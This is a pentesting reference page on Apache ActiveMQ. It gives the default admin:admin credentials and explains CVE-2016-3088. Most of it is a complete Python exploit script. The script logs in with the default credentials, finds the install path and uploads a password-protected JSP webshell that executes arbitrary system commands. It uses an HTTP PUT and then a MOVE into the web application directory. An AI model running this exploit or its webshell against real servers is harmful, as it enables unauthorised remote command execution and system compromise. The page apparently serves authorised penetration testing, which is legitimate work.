---
description: Pentesting ActiveMQ
---

# ActiveMQ

### ActiveMQ default credentials

```
admin:admin
```

### CVE-2016-3088

The Fileserver web application in Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request.

#### Confirm the vulnerability

Versions prior to 5.14.0 and with the "filserver" RESTful API **enabled are vulnerable**:

<figure><img src="../../.gitbook/assets/activemq1.png" alt=""><figcaption></figcaption></figure>

Versions prior to 5.14.0 with the "fileserver" RESTful API **disabled are NOT vulnerable:**

<figure><img src="../../.gitbook/assets/activemq2.png" alt=""><figcaption></figcaption></figure>

#### **Exploitation**

The following python script will upload a Webshell (protected by a password). Modify the name of the file as well as the password as you desire:

{% code overflow="wrap" %}
```python
#https://github.com/cyberaguiar/CVE-2016-3088
##!/usr/bin/python3
# -*- coding:utf-8 -*-
# author(cn):大剑
# author(en):cl4ym0re

import argparse
import requests
import re

banner = """
   ___          __      ____    ___   _   __          _____   ___    ___    ___  
  / __\/\   /\ /__\    |___ \  / _ \ / | / /_        |___ /  / _ \  ( _ )  ( _ ) 
 / /   \ \ / //_\ _____  __) || | | || || '_ \  _____  |_ \ | | | | / _ \  / _ \ 
/ /___  \ V ///__|_____|/ __/ | |_| || || (_) ||_____|___) || |_| || (_) || (_) |
\____/   \_/ \__/      |_____| \___/ |_| \___/       |____/  \___/  \___/  \___/  

"""


def exploit(h):
    host = h;
    header = {
    'Connection': 'close',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 '

    }
    path = str(host + 'admin/test/systemProperties.jsp')
    file_server = str(host + 'fileserver')
    api = str(host + 'api')
    admin_ = str(host + 'admin')
    req = requests.get(file_server, None)
    if (bytes("disabled", 'UTF-8') not in req.content) | (bytes("file access.", 'UTF-8') in req.content):
        print("\n[+]fileserver Detected!\n")
        req = requests.get(api, auth=('admin', 'admin'))
        if bytes('Directory: /api/', 'UTF-8') in req.content:
            print("[+]Weak password Detected!\n")
            req = requests.get(admin_, auth=('admin', 'admin'))
            html = str(req.content, 'UTF-8')
            version = re.search('5\.\d+\.\d+', html).group()
            print('[+]ActiveMQ version:' + version + '\n')
            choice = input("[+]It seems like the host is vulnerable,upload webshell?[y/n]\n")
            if choice != "y":
                exit()
            else:
                req = requests.get(path, auth=('admin', 'admin'))
                if (bytes("activemq.home", 'UTF-8') in req.content):
                    content = str(req.content, 'UTF-8')
                    tmp_path = re.search('(activemq\.home[</td>]+)([\r|\n|\s]+)([<td>]+)(.*)([</td>]+)', content).group()
                    ab_path = re.sub('activemq\.home|<td>|</td>|\r|\n|\s', '', tmp_path)
                    print("[+]absolute path obtained:" + ab_path + '\n')
                    #Here you can paste your own webshell↓
                    payload = r"""<% if("9527".equals(request.getParameter("pwd"))){
                    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
                    int a = -1;
                    byte[] b = new byte[2048];
                    out.print("<pre>");
                    while((a=in.read(b))!=-1){
                        out.println(new String(b));
                    }
                    out.print("</pre>");
                }
            %>"""
                    tmp_shell_path = file_server + "/noharm.txt"
                    put = requests.put(tmp_shell_path, data=payload, headers=header)
                    if put.status_code == 204:
                        print("[+]Upload txt file success,trying to go deeper......\n")
                        evil_headers = {
                            'Destination': 'file://' + ab_path + '/webapps/api/webshell.jsp',
                            'Connection': 'close',
                            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101'
                        }
                        move = requests.request('MOVE', url=tmp_shell_path, headers=evil_headers)
                        if move.status_code == 204:
                            print("[*]Here is your shell,enjoy!:" + host + "api/webshell.jsp?pwd=9527&i=whoami")
                            exit()
                else:
                    print("[-]Cant figure out the absolute path!")
        else:
            print("[-]Host is NOT VULNERABLE!!")
    else:
        print('[-]CAN NOT access fileserver!!\n[-]Host is NOT VULNERABLE!!')

if __name__ == '__main__':
    print(banner)
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",help="http://www.target.com/",type=str)
    args = parser.parse_args()
    if args.url != None:
        exploit(args.url)
    else:
        print("[-]No URL address was provided or the URL address is illegal")
        print("[?]usage: python CVE-2016-3088.py -u http://ip(domain):port/)")


```
{% endcode %}
